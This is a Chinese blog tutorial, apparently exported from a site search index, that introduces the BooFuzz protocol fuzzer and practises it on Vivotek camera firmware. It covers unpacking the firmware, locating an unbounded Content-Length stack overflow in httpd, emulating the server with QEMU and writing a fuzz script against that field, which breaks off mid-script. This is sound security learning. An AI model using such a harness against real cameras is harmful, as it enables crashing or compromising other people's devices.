<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BooFuzz入门-Vivotek摄像头栈溢出漏洞</title>
    <link href="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>IOT FUZZ学习ing</p><span id="more"></span><h1 id="BooFuzz入门-Vivotek摄像头栈溢出漏洞"><a href="#BooFuzz入门-Vivotek摄像头栈溢出漏洞" class="headerlink" title="BooFuzz入门-Vivotek摄像头栈溢出漏洞"></a>BooFuzz入门-Vivotek摄像头栈溢出漏洞</h1><h2 id="BooFuzz介绍"><a href="#BooFuzz介绍" class="headerlink" title="BooFuzz介绍"></a>BooFuzz介绍</h2><p>Boofuzz是一个基于生成的黑盒协议模糊测试框架，继承自Sulley，基于python语言。</p><h2 id="BooFuzz使用"><a href="#BooFuzz使用" class="headerlink" title="BooFuzz使用"></a>BooFuzz使用</h2><p><a href="https://boofuzz.readthedocs.io/en/stable/user/quickstart.html">官方文档</a>，有User Guide和API文档</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>官方建议在python虚拟环境中使用boofuzz，同时python版本不能太低，具体可以看文档中的changelog</p><p>安装虚拟环境及boofuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install python3-venv build-essential<br></code></pre></td></tr></table></figure><p>在当前目录创建虚拟环境env，env是可以自定义的环境名称</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m venv env<br></code></pre></td></tr></table></figure><p>激活虚拟环境，激活后终端前面会标识(env)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source ./env/bin/activate<br></code></pre></td></tr></table></figure><p>安装最新版的pip和setuptools再安装boofuzz包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install -U pip setuptools<br>pip install boofuzz<br></code></pre></td></tr></table></figure><h3 id="fuzz脚本编写"><a href="#fuzz脚本编写" class="headerlink" title="fuzz脚本编写"></a>fuzz脚本编写</h3><p><a href="https://blog.csdn.net/qq_34905587/article/details/108006828">该文章</a>实现了一个boofuzz脚本生成器，可以导入请求的文本文件生成对应的boofuzz脚本</p><p>下面是boofuzz的基本步骤以及一些不充分的解释，要熟练掌握boofuzz还得是结合api文档读源码，下面贴一张网上找的源码结构图</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1.webp" alt="1"></p><h4 id="创建Session会话"><a href="#创建Session会话" class="headerlink" title="创建Session会话"></a>创建Session会话</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#示例</span><br>session = Session(<br>    target=Target(<br>        connection=SocketConnection(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">8080</span>, proto=<span class="hljs-string">&#x27;tcp&#x27;</span>)))<br></code></pre></td></tr></table></figure><h4 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h4><p> <a href="https://boofuzz.readthedocs.io/en/stable/user/static-protocol-definition.html#static-primitives">静态协议定义api</a></p><p>以下面代码为例，定义了部分http请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">s_initialize(name=<span class="hljs-string">&quot;Request&quot;</span>) <br>   <span class="hljs-keyword">with</span> s_block(<span class="hljs-string">&quot;Request-Line&quot;</span>):<br>        <span class="hljs-comment"># LINE 1</span><br>        s_static(<span class="hljs-string">&quot;POST&quot;</span>, name=<span class="hljs-string">&quot;Method&quot;</span>)<br>        s_delim(<span class="hljs-string">&quot; &quot;</span>, name=<span class="hljs-string">&#x27;space-1&#x27;</span>)<br>        s_string(<span class="hljs-string">&quot;/fromLogin&quot;</span>, name=<span class="hljs-string">&#x27;Request-URI&#x27;</span>)  <span class="hljs-comment"># variation</span><br>        s_delim(<span class="hljs-string">&quot; &quot;</span>, name=<span class="hljs-string">&#x27;space-2&#x27;</span>)<br>        s_static(<span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>, name=<span class="hljs-string">&#x27;HTTP-Version&#x27;</span>)   <br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br><br>        <span class="hljs-comment"># LINE 2</span><br>        s_static(<span class="hljs-string">&quot;Host&quot;</span>, name=<span class="hljs-string">&quot;Host&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;: &quot;</span>)<br>        s_static(<span class="hljs-string">&quot;192.168.10.1&quot;</span>, name=<span class="hljs-string">&quot;ip&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br><br>        <span class="hljs-comment"># LINE 3  </span><br>        s_static(<span class="hljs-string">&#x27;Content-Length&#x27;</span>)<br>        s_static(<span class="hljs-string">&#x27;: &#x27;</span>)<br>        s_size(<span class="hljs-string">&#x27;data&#x27;</span>, output_format=<span class="hljs-string">&#x27;ascii&#x27;</span>, fuzzable=<span class="hljs-literal">True</span>)    <span class="hljs-comment"># size的值根据data部分的长度自动进行计算，同时对该字段进行fuzz</span><br>        s_static(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>    <span class="hljs-comment"># 对应http请求数据</span><br>    <span class="hljs-keyword">with</span> s_block(<span class="hljs-string">&#x27;data&#x27;</span>):<br>        s_static(<span class="hljs-string">&#x27;login_name=&amp;curTime=1581845487827&amp;setLang=&amp;setNoAutoLang=&amp;login_n=admin&amp;login_pass=&#x27;</span>)<br>        s_string(<span class="hljs-string">&#x27;123456&#x27;</span>, max_len=<span class="hljs-number">1024</span>)<span class="hljs-comment"># 需要变异，且最大长度为1024</span><br>        s_static(<span class="hljs-string">&#x27;&amp;languageSel=1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>s_initialize</p><p>s_static生成Static primitives，是固定的，在模糊测试时不会突变</p><p>s_delim，s_string是动态的，不指定fuzzable &#x3D; false的情况下在模糊测试时会发生突变</p><p>s_size与第一个name参数对应的block块绑定，以ascii的形式返回绑定的块的大小</p><p>最终定义的消息如下，对&#x2F;fromLogin以及前后的空格，login_pass&#x3D;后的123456字段进行了fuzz</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/fromLogin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.10.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>103<br><br><span class="language-dts">login_<span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>curT<span class="hljs-attr">ime</span><span class="hljs-operator">=</span><span class="hljs-number">1581845487827</span><span class="hljs-variable">&amp;</span>setL<span class="hljs-attr">ang</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>setNoAutoL<span class="hljs-attr">ang</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;login_n</span>=admin<span class="hljs-variable">&amp;login_pass</span>=<span class="hljs-number">123456</span><span class="hljs-variable">&amp;</span>languageS<span class="hljs-attr">el</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><br></code></pre></td></tr></table></figure><h4 id="链接请求，构建状态图"><a href="#链接请求，构建状态图" class="headerlink" title="链接请求，构建状态图"></a>链接请求，构建状态图</h4><p>初始的Session中是没有请求的，需要手动将之前定义的请求按照一定的先后顺序链接起来，如果只有单个请求需要fuzz，那么直接添加即可。同时也可以在两个请求之间注册回调函数，这个回调函数会在状态转移时被调用，可以来收集返回包信息等。</p><p>例如以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">session.connect(s_get(<span class="hljs-string">&#x27;login&#x27;</span>))<span class="hljs-comment"># 默认前置节点为root</span><br>session.connect(s_get(<span class="hljs-string">&#x27;login&#x27;</span>), s_get(<span class="hljs-string">&#x27;setsysemailsettings&#x27;</span>), callback=add_auth_callback)<br>session.connect(s_get(<span class="hljs-string">&#x27;login&#x27;</span>),s_get(<span class="hljs-string">&#x27;setsyslogsettings&#x27;</span>), callback=add_auth_callback)<br>session.connect(s_get(<span class="hljs-string">&#x27;login&#x27;</span>),s_get(<span class="hljs-string">&#x27;setschedulesettings&#x27;</span>), callback=add_auth_callback)<br></code></pre></td></tr></table></figure><p>对应的协议树如下</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2.png" alt="2"></p><p>在发送完login请求完成登陆后，才能发送后面的几个请求，同时在login后添加了回调函数</p><h4 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h4><p>传入一个请求的name的话就会只fuzz这个请求，不传默认按建立的状态图去遍历着fuzz，fuzz时可以访问 <a href="http://127.0.0.1:26000/%E6%9F%A5%E7%9C%8B%E7%BB%9F%E8%AE%A1%E6%95%B0%E6%8D%AE">http://127.0.0.1:26000/查看统计数据</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.fuzz()<br></code></pre></td></tr></table></figure><h4 id="添加对目标设备的监控和重启机制等"><a href="#添加对目标设备的监控和重启机制等" class="headerlink" title="添加对目标设备的监控和重启机制等"></a>添加对目标设备的监控和重启机制等</h4><p>监视器用来检测目标是否崩溃，是否正常运行，收集目标程序返回包的信息，启动、停止和重新启动目标等。</p><p>Boofuzz 提供三种监视器：ProcessMonitor、NetworkMonitor、CallbackMonitor，它们都基于BaseMonitor，都具备BaseMonitor的基础功能。</p><p>一般可以在session中添加回调函数，回调函数有下面三种</p><ul><li><strong>pre_send_callbacks</strong> – 在每个模糊请求之前都会调用已注册的方法。 默认值：None。</li><li><strong>post_test_case_callbacks</strong> – 在每个模糊测试用例之后都会调用已注册的方法。 默认值：None。</li><li><strong>post_start_target_callbacks</strong>  – 方法将在目标启动或重新启动后调用， 比如说，通过进程监视器。</li></ul><h2 id="BooFuzz练习-Vivotek摄像头固件栈溢出漏洞"><a href="#BooFuzz练习-Vivotek摄像头固件栈溢出漏洞" class="headerlink" title="BooFuzz练习-Vivotek摄像头固件栈溢出漏洞"></a>BooFuzz练习-Vivotek摄像头固件栈溢出漏洞</h2><p><a href="https://zhuanlan.zhihu.com/p/581871058">参考</a></p><h3 id="解包固件"><a href="#解包固件" class="headerlink" title="解包固件"></a>解包固件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">binwalk -Me CC8160-VVTK-0100d.flash.pkg<br></code></pre></td></tr></table></figure><h3 id="文件结构解析"><a href="#文件结构解析" class="headerlink" title="文件结构解析"></a>文件结构解析</h3><p>使用tree命令查看文件结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs shell">_CC8160-VVTK-0100d.flash.pkg.extracted$ tree -d -L 5<br>.<br>├── _31.extracted<br>│   ├── boot<br>│   ├── defconf<br>│   │   └── _CC8160.tar.bz2.extracted<br>│   │       └── _0.extracted<br>│   │           └── etc<br>│   ├── dtb<br>│   ├── _kernel.img.extracted<br>│   │   └── _5FB4.extracted<br>│   │       ├── cpio-root<br>│   │       │   ├── dev<br>│   │       │   └── root<br>│   │       ├── dev<br>│   │       └── root<br>│   ├── nandspl<br>│   └── _rootfs.img.extracted<br>│       └── squashfs-root<br>│           ├── bin<br>│           ├── dev<br>│           │   ├── misc<br>│           │   ├── net<br>│           │   ├── pts<br>│           │   ├── shm<br>│           │   └── snd<br>│           ├── drivers<br>│           ├── etc<br>│           │   ├── default<br>│           │   ├── init.d<br>│           │   └── udhcpc<br>│           ├── home<br>│           ├── lib<br>│           │   └── iptables<br>│           ├── mnt<br>│           │   ├── auto<br>│           │   ├── flash<br>│           │   ├── flash2<br>│           │   └── ramdisk<br>│           ├── proc<br>│           ├── root<br>│           ├── sbin<br>│           ├── sys<br>│           ├── tmpfs<br>│           │   ├── CF<br>│           │   ├── samba<br>│           │   ├── tmp<br>│           │   └── var<br>│           ├── usr<br>│           │   ├── bin<br>│           │   ├── lib<br>│           │   ├── local<br>│           │   ├── sbin<br>│           │   └── share<br>│           └── www<br>│               ├── colorpicker<br>│               ├── css<br>│               ├── include<br>│               ├── pic<br>│               └── setup<br>├── _BD6E8E.extracted<br>├── _D48788.extracted<br>└── _DC7909.extracted<br>    └── setup<br>        └── vadppkg<br>            ├── _genetec-vadp-1-0-2-7.tar.gz.extracted<br>            │   └── _0.extracted<br>            └── _stratocast-1-1-1-3.tar.gz.extracted<br>                └── _0.extracted<br></code></pre></td></tr></table></figure><p>大部分内容都在_31.extracted文件夹中，其中<strong>boot</strong>文件夹中是u-boot的主程序；<strong>dtb</strong>文件夹中是内核的设备树文件；<strong>kernel.img.extracted</strong>是提取后的内核镜像文件，没东西；<strong>nandspl</strong>中没有提取出文件，但是nandspl本身是针对nandflash的二级程序加载器(secondary program loader)，也是u-boot的一部分，在u-boot主程序前执行，进行最基本的硬件初始化，比如关闭中断，内存初始化，设置堆栈等。这几个文件可以总结为以下流程：</p><p>ROM code -&gt; u-boot spl -&gt; uboot主程序 -&gt;加载kernel。</p><p>关于u-boot spl,具体可以看<a href="https://blog.csdn.net/u010632165/article/details/94429235">这里</a></p><p>然后就是最重要的<strong>rootfs.img.extracted</strong>，这是提取后的文件系统。</p><p>提取的文件系统中etc目录下很多文件都是软链接，链接到了defconf目录下的etc文件夹中，可以用’’ls -l’’命令查看.</p><h3 id="寻找服务程序"><a href="#寻找服务程序" class="headerlink" title="寻找服务程序"></a>寻找服务程序</h3><p><a href="https://www.cnblogs.com/aaronLinux/p/6860478.html">linux启动流程</a>，大致为</p><p>init程序（linuxrc） -&gt; busybox -&gt; &#x2F;etc&#x2F;inittab -&gt; &#x2F;etc&#x2F;init.d&#x2F;rcS</p><p>所以进入文件系统找到”**&#x2F;etc&#x2F;init.d&#x2F;rcS**”开机自启文件，在下面代码中用run-parts命令遍历执行了”<strong>&#x2F;etc&#x2F;rcS.d</strong>“目录下的所有可执行脚本。</p><p>这里注释标注的是Start daemons，即启动守护进程。守护进程是运行在后台的一种特殊进程，它独立于控制终端并且周期性地执行某种任务或循环等待处理某些事件的发生。很多服务进程如httpd都是守护进程。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Apply patch brfore rcS.d</span><br>echo &quot;check apply_patch_before&quot;<br>if [ -f /mnt/flash2/patch/apply_patch_before ]; then<br>chmod 777 /mnt/flash2/patch/apply_patch_before<br>/mnt/flash2/patch/apply_patch_before<br>fi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Start daemons</span><br>echo &quot;run-parts -a start /etc/rcS.d&quot;<br>run-parts -a start /etc/rcS.d<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Apply patch after rcS.d</span><br>echo &quot;check apply_patch_after&quot;<br>if [ -f /mnt/flash2/patch/apply_patch_after ]; then<br>chmod 777 /mnt/flash2/patch/apply_patch_after<br>/mnt/flash2/patch/apply_patch_after<br>fi<br><br>logger &quot;init-rcS end&quot;<br>exit 0<br></code></pre></td></tr></table></figure><p>rcS.d在&#x2F;etc中是个软链接，指向”..&#x2F;mnt&#x2F;flash&#x2F;etc&#x2F;rcS.d”,在提取出的文件中位于”31.extracted&#x2F;defconf&#x2F;_CC8160.tar.bz2.extracted&#x2F;_0.extracted&#x2F;etc&#x2F;“,该目录下的文件都被软链接到了&#x2F;etc。</p><p>进入rcS.d，里面都是开机自启服务进程的执行脚本，发现执行脚本均为软连接文件，连接至”etc&#x2F;init.d&#x2F;“下的对应启动脚本文件，在启动脚本文件中可以找到可执行二进制程序的真正位置。</p><p>以httpd服务为例，启动过程如下：</p><p>&#x2F;etc&#x2F;init.d&#x2F;rcS -&gt; &#x2F;etc&#x2F;rcS.d&#x2F;S31httpd -&gt; &#x2F;etc&#x2F;init.d&#x2F;httpd -&gt; &#x2F;usr&#x2F;sbin&#x2F;httpd</p><h3 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h3><p>结合对httpd程序的逆向，可以判断这里用的是boa二次开发的web服务器</p><p>ida中查找字符串Content-Length即可，这里会将Content-Length字段后从:到\n全都复制到栈上的dest变量，没有限制长度，导致了栈溢出。</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png" alt="3"></p><h3 id="固件仿真"><a href="#固件仿真" class="headerlink" title="固件仿真"></a>固件仿真</h3><p>查看漏洞程序信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">file httpd</span><br>httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">checksec httpd</span><br>    Arch:     arm-32-little<br>    RELRO:    No RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8000)<br></code></pre></td></tr></table></figure><p>httpd的配置文件是&#x2F;etc&#x2F;conf.d&#x2F;boa&#x2F;boa.conf，conf.d是软链接的，这里失效了，所以要替换软链接，将31.extracted&#x2F;defconf&#x2F;_CC8160.tar.bz2.extracted&#x2F;_0.extracted&#x2F;etc中的文件复制到31.extracted&#x2F;_rootfs.img.extracted&#x2F;squashfs-root&#x2F;etc，选择全部替换</p><p>然后用户态qemu模拟运行httpd程序，尝试运行报错，无&#x2F;dev&#x2F;null</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/bin/qemu-arm-static Path_to/squashfs-root</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> ./squashfs-root/ /qemu-arm-static /usr/sbin/httpd</span> <br>src/boa.c:284 (main) - can&#x27;t open /dev/null: No such file or directory<br></code></pre></td></tr></table></figure><p>解决</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">touch .<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p>继续运行，虽然输出Success，但是并没有对应的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> ./squashfs-root/ /qemu-arm-static /usr/sbin/httpd -c /etc/conf.d/boa -d</span> <br>sendto() error 20<br>[debug]add server push uri 3 video3.mjpg<br>[debug]add server push uri 4 video4.mjpg<br>gethostbyname:: Success<br></code></pre></td></tr></table></figure><p>用ida打开httpd，查看gethostbyname字符串交叉索引定位到函数。先获取hostname,再解析成ip。先.&#x2F;etc&#x2F;hosts解析再dns解析，所以这里改hosts文件中127.0.0.1对应的hostname</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/4.png" alt="4"></p><p>先hostname获取主机名，再把hosts文件中的Network-Camera改成主机名</p><p>在&#x2F;etc&#x2F;init.d&#x2F;httpd中找到httpd的启动参数，运行服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> ./ /qemu-arm-static /usr/sbin/httpd -c /etc/conf.d/boa -d</span>  <br>sendto() error 20<br>[debug]add server push uri 3 video3.mjpg<br>[debug]add server push uri 4 video4.mjpg<br>[debug] after ini, server_push_uri[0] is /video3.mjpg<br>[debug] after ini, server_push_uri[1] is /video4.mjpg<br>fopen pid file: Not a directory<br>[01/Nov/2023:04:13:00 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)<br>[01/Nov/2023:04:13:00 +0000] boa: starting server pid=4978, port 80<br></code></pre></td></tr></table></figure><p>访问127.0.0.1发现服务正常，运行成功</p><h3 id="进行fuzz"><a href="#进行fuzz" class="headerlink" title="进行fuzz"></a>进行fuzz</h3><p><a href="https://zhuanlan.zhihu.com/p/581871058">脚本来源</a></p><p>只对Content-Length字段进行fuzz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> boofuzz <span class="hljs-keyword">import</span>*<br>IP = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>PORT = <span class="hljs-number">80</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_response</span>(<span class="hljs-params">target,fuzz_data_logger,session,*args,**kwargs</span>):<br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;Checking for response ...&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        response = target.recv(<span class="hljs-number">512</span>)<br>    <span class="hljs-keyword">except</span>:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Unable to connect ...&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Empty response ...&quot;</span>)<br>        target.close()<br>        <span class="hljs-keyword">return</span><br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;Start checking ...\n&quot;</span>+response.decode())<br>    target.close()<br>    <span class="hljs-keyword">return</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    session = Session(<br>        target=Target(connection=SocketConnection(IP,PORT,proto=<span class="hljs-string">&quot;tcp&quot;</span>),<br>        ),<br>        post_test_case_callbacks=[check_response],<br>    )<br>    s_initialize(name=<span class="hljs-string">&quot;FUZZ&quot;</span>)<br>    <span class="hljs-keyword">with</span> s_block(<span class="hljs-string">&quot;Request-Line&quot;</span>):<br>        <span class="hljs-comment"># Method</span><br>        s_group(<span class="hljs-string">&quot;Method&quot;</span>,[<span class="hljs-string">&quot;POST&quot;</span>])<br>        s_delim(<span class="hljs-string">&quot; &quot;</span>,fuzzable=<span class="hljs-literal">False</span>)<br>        s_string(<span class="hljs-string">&quot;/cgi-bin/admin/upgrade.cgi &quot;</span>,fuzzable=<span class="hljs-literal">False</span>,name=<span class="hljs-string">&quot;URI&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;HTTP/1.1&quot;</span>,name=<span class="hljs-string">&quot;Version&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,name=<span class="hljs-string">&quot;CRLF&quot;</span>)<br>        <span class="hljs-comment"># Host</span><br>        s_static(<span class="hljs-string">&quot;Host&quot;</span>)<br>        s_delim(<span class="hljs-string">&quot;: &quot;</span>,fuzzable=<span class="hljs-literal">False</span>)<br>        s_string(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,fuzzable=<span class="hljs-literal">False</span>,name=<span class="hljs-string">&quot;IP&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>        <span class="hljs-comment"># Connection</span><br>        s_static(<span class="hljs-string">&quot;Connection&quot;</span>)<br>        s_delim(<span class="hljs-string">&quot;: &quot;</span>,fuzzable=<span class="hljs-literal">False</span>)<br>        s_string(<span class="hljs-string">&quot;Close&quot;</span>,fuzzable=<span class="hljs-literal">False</span>,name=<span class="hljs-string">&quot;Active&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>        <span class="hljs-comment"># Content-Length</span><br>        s_static(<span class="hljs-string">&quot;Content-Length&quot;</span>)<br>        s_delim(<span class="hljs-string">&quot;: &quot;</span>, fuzzable=<span class="hljs-literal">False</span>)<br>        s_string(<span 